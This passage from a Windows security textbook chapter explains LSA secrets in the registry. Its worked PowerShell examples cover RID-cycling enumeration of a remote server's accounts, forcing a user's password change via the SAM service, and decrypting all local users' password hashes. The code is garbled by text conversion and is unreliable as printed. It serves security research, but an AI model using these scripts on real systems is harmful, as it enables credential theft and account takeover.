</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td
```

Listing 10-36: Enumerating the children of the SECURITY\Policy\Secrets key

Listing 10-36 lists the subkeys of the Secrets key ❶ . The name of each subkey is the string used when opening the secret via the domain policy remote service. For example, we can see the DPAPI_SYSTEM secret we accessed in Listing 10-17 in the output.

When we inspect the values of that key ❷ , we find its current and old values and timestamps, as well as the security descriptor for the secret object. The secret's contents are stored as the default value in the key, so we

Windows Authentication  335

---

can display it as hex ❸ You might notice that the value of the secret isn't the same as the one we dumped via the domain policy remote service. As with the user object data, the LSA will try to obfuscate values in the registry to prevent trivial disclosure of the contents. The system key is used, but with a different algorithm; I won't dig further into the details of this.

## Worked Examples

Let's walk through some examples to illustrate how you can use the various commands you saw in this chapter for security research or systems analysis purposes.

### RID Cycling

In "Name Lookup and Mapping" on page 323, I mentioned an attack called RID cycling that uses the domain policy remote service to find the users and groups present on a computer without having access to the SAM remote service. In Listing 10-37, we perform the attack using some of the commands introduced in this chapter.

```bash
PS> function Get-SidNames {
      param({
       ♂ [string]$$Server,
         [string]$Domain,
         [int]$MinRid = 500,
         [int]$MaxRid = 1499
    })
    if ("" -eq $Domain) {
        $Domain = $Server
  }  Use-NtObject($policy = Get-LsaPolicy -SystemName -$Server -Access
    LookupName} {
     ♂ $domain_sid = Get-LsaSid $policy "$Domain\" \
     ♂ $sids = $MinRid.$MaxRid | ForEach-Object {
        Get-NtSid -BaseSid $domain_sid -RelativeIdentifier $_\
    }</td>
     ♂ Get-LsaName -Policy $policy -Sid $sids | Where-Object NameUse
  -ne "Unknown" "
    }</td>
  ♂ PS> Get-SidNames -Server "CINNABAR" | Select-Object QualifiedName, Sddl
     QualifiedName                Sddl
     ----------------------------- ------
     CINNABARAdministrator   S-1-5-21-2182728098-2243322206-226510368-500
     CINNABAR-Guest               S-1-5-21-2182728098-2243322206-226510368-501
     CINNABAR-DefaultAccount    S-1-5-21-2182728098-2243322206-226510368-503
     CINNABAR-WADAGUITYAccount  S-1-5-21-2182728098-2243322206-226510368-504
     CINNABAR-None                 S-1-5-21-2182728098-2243322206-226510368-510
     CINNABAR-LocalAdmin        S-1-5-21-2182728098-2243322206-226510368-1000
```

Listing 10-37: A simple RID cycling implementation

336    Chapter 10

---

First, we define the function to perform the RID cycling attack. We need four parameters: ♦ the server that we want to enumerate, the domain in the server to enumerate, and minimum and maximum RID values to check. The lookup process can request only 1,000 SIDs at a time, so we set a default range within that limit, from 500 to 1499 inclusive, which should cover the range of RIDs used for user accounts and groups.

Next, we open the policy object and request LookUpName access ❶. We need to look up the SID for the domain by using its simple name ⃝. With the domain SID, we can create relative SIDs for each RID we want to bruteforce and look up their names ⃝. If the returned object's NameSet property is set to Unknown, then the SID didn't map to a username ⃝. By checking this property, we can filter out invalid users from our enumeration.

Finally, we test this function on another system on our local domain network ❶ . You need to be able to authenticate to the server to perform the attack. On a domain-joined system, this should be a given. However, if your machine is a stand-alone system, the attack might fail without authentication credentials.

## Forcing a User’s Password Change

In the discussion of user objects in the SAM database, I mentioned that if a caller is granted ForcePasswordChange access on a user object they can force a change of the user's password. Listing 10-38 shows how to do this using the commands described in this chapter.

```bash
PS> function Get-UserObject([string]&Server, [string]&User) {
        Use-NtObject($sam = Connect-SamServer -ServerName $Server) {
            Use-NtObject($domain = Get-SamDomain -Server $sam -User) {
                Get-SamUser -Domain $domain -Name $User -Access
ForcePasswordChange
    }
    }
}
PS> function Set-UserPassword([string]&Server, [string]&User,
[bool]&Expired) {
        Use-NtObject($user_obj = Get-UserObject $Server $User) {
            $pwd = Read-Host -AsSecureString -Prompt "New Password"
            $user_obj.SetPassword($pwd, $Expired)
    }
```

Listing 10-38: Force-changing a user's password via the SAM remote service

We first define a helper function that opens a user object on a specified server. We open the user domain using the User parameter and explicitly request the ForcePasswordChange access right, which will generate an access denied error if it's not granted.

We then define a function that sets the password. We'll read the password from the console, as it needs to be in the secure string format. The Expired parameter marks the password as needing to be changed the next

Windows Authentication  337

---

time the user authenticates. After reading the password from the console, we call the SetPassword function on the user object.

We can test the password setting function by running the script in Listing 10-39 as an administrator.

```bash
PS> Set-UserPassword -Server $env:COMPUTERNAME "user"
New Password: **********
Listing 10-39: Setting a user's password on the current computer
```

To be granted ForcePasswordChange access, you need to be an administrator on the target machine. In this case, we're running as an administrator locally. If you want to change a remote user's password, however, you'll need to authenticate as an administrator on the remote computer.

## Extracting All Local User Hashes

In "Accessing the SAM Database Through the Registry" on page 325, we defined functions to decrypt a user's password hash from the SAM database. To use those functions to decrypt the passwords for all local users automatically, run Listing 10-40 as an administrator.

```bash
❶ PS> function Get-PasswordHash {
    param(
        [byte[]]&Pek,
        $Key,
        $Rid,
        [switch]&LmHash
    )
    $index = 14
    $type = 2
    if ($lmHash) {
        $index = 13
        $type = 1
    }
    $hash_enc = Get-VariableAttribute $key -Index $index
    if ($null -eq $hash_enc) {
        return @()
    }
    $hash_dec = Unprotect-PasswordHash -Key $Pek -Data $hash_enc -Rid $Rid
    -Type $type
    if ($hash dec.Length -gt 0) {
        Unprotect-PasswordHashDES -Hash $hash_dec -Rid $Rid
    }
    }
❷ PS> function Get-UserHashes {
    param(
        [Parameter(Mandatory)]
        [byte[]]&Pek,
        [Parameter(Mandatory, ValueFromPipeline)]
        $Key
    )
```

---

```bash
PROCESS {
        try {
            if ($null -eq $key["0"]) {
                return
            }
            $rid = [int]::Parse($key.Name, "HexNumber")
            $name = Get-VariableAttribute $key -Index 1
            [PCustomObject]&lt;
                Name=[System.Text.Encoding]:Unicode.GetString($name)
                LmHash = Get-PasswdHash $Pek $key $rid -LmHash
                NtHash = Get-PasswdHash $Pek $key $rid
                Rid = $rid
            } catch {
                Write-Error $_
            }
            }
    }
} PS> $pek = Unprotect-PasswordEncryptionKey
} PS> ls "SEC:\SAM\SAM\Domains\Account\Users" | Get-UserHashes $pek
  Name                     LmHash NtHash                    Rid
               ...... ......               ......
  Administrator                          500
  Guest                          501
  DefaultAccount                       503
  WADAGUtilityAccount           {125, 218, 222, 22...}   504
  Admin                          {81, 26, 59, 38...}     1001
```

Listing 10-40: Decrypting the password hashes of all local users

We start by defining a function to decrypt a single password hash from a user's registry key ❶ . We select which hash to extract based on the $\mathtt{utf8}$ ash parameter, which changes the index and the type for the RC4 key. We then call this function from the $\texttt{get-userhash}$ function ❸ , which extracts other information, such as the name of the user, and builds a custom object.

To use the get-UserHashes function, we first decrypt the password encryption key ❸ , then enumerate the user accounts in the registry and pipe them through it ❹ . We can see in the output that only two users have NT password hashes, and no user has an LM hash configured.

## Wrapping Up

We started this chapter with a discussion of Windows domain authentication. We went through the various levels of complexity, starting with a local domain on a stand-alone computer and moving through a networked domain and a forest. Each level of complexity has an associated configuration that can be accessed to determine what users and/or groups are available within an authentication domain.

---

Following that, we examined various built-in PowerShell commands you can use to inspect the authentication configuration on the local system. For example, the Get-LocalUser command will list all registered users, as well as whether they're enabled or not. We also saw how to add new users and groups.

We then looked at the LSA policy, which is used to configure various security properties (such as the audit policy described in Chapter 9), what privileges a user is assigned, and what types of authentication the user can perform.

Next, we explored how to access the configuration internally, whether locally or on a remote system, using the SAM remote service and domain policy service network protocols. As you saw, what we normally consider a group is referred to as an alias internally.

We finished the chapter with a deep dive into how the authentication configuration is stored inside the registry and how you can perform a basic inspection of it. We also looked at an example of how to extract a user's hashed password from the registry.

In the next chapter, we'll take a similar look at how the authentication configuration is stored in an Active Directory configuration, which is sig- nificantly more complex than the local configuration case.

---

